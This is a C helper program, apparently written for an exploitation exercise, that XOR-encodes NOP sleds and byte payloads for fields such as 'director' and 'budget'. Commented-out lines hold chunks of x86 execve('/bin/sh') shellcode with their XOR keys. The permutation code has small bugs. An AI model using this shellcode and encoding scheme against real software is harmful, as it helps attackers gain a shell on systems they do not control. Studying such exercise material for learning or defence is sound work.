#include <stdlib.h>
#include <stdio.h>

void xor_field(char* field, const int fieldLen, const char* key, const int keyLen);
void permute_field(char* field, const int fieldLen, const int* perm, const int permLen);
void undo_permute(char* field, const int fieldLen, const int* perm, const int permLen);
void print_char_array(const char* array, int size);

int main(int argc, char* argv[])
{
    // director 300 - 10
    //int size = 10;
    //char field[10] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    //char   key[10] = "\x49\xcc\x75\xd2\xd3\x25\xec\xd2\x3a\xc6";

    // star3 300 - 50
    //int size = 50;
    //char field[50] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    //char   key[50] = "\xea\xa6\x08\xa6\x03\x99\x99\x65\x49\x2d\x4a\x83\x32\xad\x8b\xbb\xee\xb8\xde\xc1\xab\x2a\xee\x25\x34\xde\x02\xa0\x7b\x56\x61\x02\x33\x40\xe9\x1c\x5a\x78\x05\xb1\xf6\xa8\x67\xd7\xda\xc4\x03\xe7\x71\xfe";

    // star5 300 - 100
    //int size = 100;
    //char field[100] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    //char   key[100] = "\x96\xd6\x5d\x36\x24\x8e\x8c\xa1\x35\x91\x68\x9c\xcd\x26\x3c\xe5\x82\x67\x03\x00\xf5\xdb\xfb\x62\x5f\x9d\x2d\xb0\x99\x0e\x33\x2b\xf4\xde\x88\x5f\x46\x75\xd3\x02\x03\xb4\xeb\x04\x3a\x3c\xe6\x28\x00\xa6\xce\xa9\x9c\x34\x51\x11\x01\x3f\xa2\x0f\x02\xd6\x1b\xec\xb0\x75\x85\x7b\x02\x01\x8e\x28\x82\xdf\xc6\xbb\xb8\x85\x1a\xff\x6a\xec\x6d\x33\x3e\x66\xde\x44\x62\x2d\xc8\x10\x58\x47\xac\x7b\x0e\x53\x9f\x12";

    // summary 2000 - 80
    int size = 80;
    char field[80] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x01\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    char   key[80] = "\x82\xfc\x5d\x9d\x5d\xc4\xfe\xe6\xa9\xb6\x98\x35\xfb\x02\x28\xe8\x9a\xc9\x64\x91\x86\x32\x02\x1d\x3c\xe0\xe7\x57\x1a\xaf\x73\x1a\xc6\x45\x55\xa3\x25\x09\xbd\xd0\x2c\xa2\x9c\x12\x2b\x25\x14\x7f\x7a\x96\x85\x9c\xd0\x7c\xa5\x4c\xdc\x36\x7d\x36\x62\x98\xd5\xe5\xbe\x30\x8e\xe3\x11\x03\xdb\x36\x01\xe9\xb5\xc9\x19\x8c\x64\x64";

    // aspect 40 - 4
    //int size = 4;
    //char field[4] = "\x90\x90\x90\x90";
    //char   key[4] = "\x0c\x00\x49\x4b";


    // composer 300 - 6
    //int size = 6;
    //char field[6] = "\x90\x90\x90\x90\x90\x90";
    //char   key[6] = "\xf3\x6f\xbe\xbd\x7c\x69";

    // shellcode in composer 300 - 6
    //int size = 6;
    //char field[6] = "\x90\x90\x90\x6a\x0b\x58";
    //char field[6] = "\x99\x52\x68\x2f\x2fs";
    //char field[6] = "h\x68\x2f\x62\x69\x6e";
    //char field[6] = "\x89\xe3\x31\xc9\xcd\x80";
    //char   key[6] = "\xf3\x6f\xbe\xbd\x7c\x69";

    printf("Before xor:\n");
    print_char_array(field, size);

    xor_field(field, size, key, size);

    printf("After xor:\n");
    print_char_array(field, size);

    xor_field(field, size, key, size);

    printf("After undo xor:\n");
    print_char_array(field, size);


    /*
    // writer 300 - 3
    int size = 3;
    char field[size] = "\x90";
    int key[size] = {1, 2, 0};

    // star1 300 - 3
    int size = 3;
    char field[size] = "\x90";
    int key[size] = {};

    // star2 300 - 3
    int size = 3;
    char field[size] = "\x90";
    int key[size] = {};

    // country 300 - 3
    int size = 3;
    char field[size] = "\x90";
    int key[size] = {};

    // budget 300 - 3
    int size = 3;
    char field[size] = "\x90";
    int key[size] = {};

    // opening_weekend 300 - 3
    int size = 3;
    char field[size] = "\x90";
    int key[size] = {};

    // runtime 300 - 3
    int size = 3;
    char field[size] = "\x90";
    int key[size] = {};
    */


    /*
    printf("Before undo_permute:\n");
    print_char_array(field, size);

    undo_permute(field, size, key, size);

    printf("After under_permute::\n");
    print_char_array(field, size);

    permute_field(field, size, key, size);

    printf("After permute:\n");
    print_char_array(field, size);
    */

    return 0;
}

void permute_field(char* field, const int fieldLen, const int* perm, const int permLen)
{
    if(fieldLen % permLen != 0) {
        fprintf(stderr, "Error: permutation length does not divide field length.");
    }

    int index;  // Index in current field. 
    int base;  // Base index of the current permutation. 
    int permItr;  // Permutation iteration we're on. 
    char* tmp = malloc(permLen);  // A temporary field for our permutation.

    // For each time we are performing our permutation.
    for(permItr = 0; permItr < fieldLen / permLen; permItr++) {

        base = permItr * permLen;

        // tmp[i] gets field[perm[i]].
        for(index = 0; index < permLen; index++) {
            tmp[index] = field[base + perm[index]];
        }

        // field[i] gets field[perm[i]].
        for(index = 0; index < permLen; index++) {
            field[base + index] = tmp[index];
        }
    }
}

void undo_permute(char* field, const int fieldLen, const int* perm, const int permLen)
{
    if(fieldLen % permLen != 0) {
        fprintf(stderr, "Error: permutation length does not divide field length.");
    }

    int index;  // Index in current field. 
    int base;  // Base index of the current permutation. 
    int permItr;  // Permutation iteration we're on. 
    char* tmp = malloc(permLen);  // A temporary field for our permutation.

    // For each time we are performing our permutation.
    for(permItr = 0; permItr < fieldLen / permLen; permItr++) {

        base = permItr * permLen;

        // tmp[i] gets field[perm[i]].
        for(index = 0; index < permLen; index++) {
            tmp[perm[index]] = field[index];
        }

        // field[i] gets field[perm[i]].
        for(index = 0; index < permLen; index++) {
            field[base + index] = tmp[index];
        }
    }
}

void xor_field(char* field, const int fieldLen, const char* key, const int keyLen)
{
    if(fieldLen % keyLen != 0) {
        fprintf(stderr, "Error: key length does not divide field length.");
    }

    int index;  // Index in current field. 
    int base;  // Base index of the current permutation. 
    int keyItr;  // Key iteration we're on. 

    // For each time we use the xor key. 
    for(keyItr = 0; keyItr < fieldLen / keyLen; keyItr++) {

        base = keyItr * keyLen;

        for(index = 0; index < keyLen; index++) {
            field[base + index] ^= key[index];
        }
    }
}

void print_char_array(const char* array, int size)
{
    int i = 0;
    for(i = 0; i < size; i++) {
        printf(" %#.2x", array[i]); 
    }
    printf("\n");
}
